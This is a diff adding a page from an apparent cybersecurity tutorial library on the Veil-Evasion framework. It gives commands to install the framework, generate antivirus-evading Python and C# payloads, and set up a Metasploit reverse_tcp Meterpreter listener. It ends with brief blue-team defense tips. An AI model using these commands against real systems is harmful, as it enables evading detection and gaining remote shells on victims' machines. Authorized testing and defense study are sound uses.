@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Veil-Evasion | TKhoa's Cybersecurity Library</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <div class="page">
+        <header>
+            <h1>Veil-Evasion Framework</h1>
+            <p>Generate antivirus evasion payloads for authorized payload testing. Integrates with Metasploit.</p>
+        </header>
+
+        <section class="card">
+            <h2>Installation</h2>
+            <pre><code>sudo apt install mono-complete git
+git clone https://github.com/Veil-Framework/Veil
+cd Veil
+./config/setup.sh --force --silent
+./Veil.py</code></pre>
+            <p><strong>Defense:</strong> Monitor git clones of Veil-Framework, mono execution.</p>
+        </section>
+
+        <section class="card">
+            <h2>List Payloads</h2>
+            <pre><code>./Veil.py -l</code></pre>
+            <p>List all available evasion payloads (python/csharp payloads).</p>
+        </section>
+
+        <section class="card">
+            <h2>Generate Python Payload</h2>
+            <pre><code>./Veil.py -t python -p 1 -o /tmp/veil_payload</code></pre>
+            <p>Create ordinal python shellcode payload with LHOST/LPORT options.</p>
+        </section>
+
+        <section class="card">
+            <h2>Generate C# Payload</h2>
+            <pre><code>./Veil.py -t csharp -p 2</code></pre>
+            <p>Dncshell payload – .NET shell bypassing Windows Defender.</p>
+        </section>
+
+        <section class="card">
+            <h2>MSF Integration</h2>
+            <pre><code>msfconsole
+use multi/handler
+set PAYLOAD python/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+exploit</code></pre>
+            <p>Listen for Veil-generated Meterpreter sessions.</p>
+        </section>
+
+        <section class="card">
+            <h2>Blue Team Defenses</h2>
+            <ul>
+                <li>Enable behavioral AV/EDR (not just signatures)</li>
+                <li>Monitor PowerShell/mono execution logs</li>
+                <li>Block unsigned .NET assembly loads</li>
+                <li>Network segmentation for C2 detection</li>
+            </ul>
+        </section>
+
+        <p class="note"><a href="post-exploitation.html">← Post-Exploitation</a> | <a href="index.html">Tools</a></p>
+    </div>
+</body>
+</html>
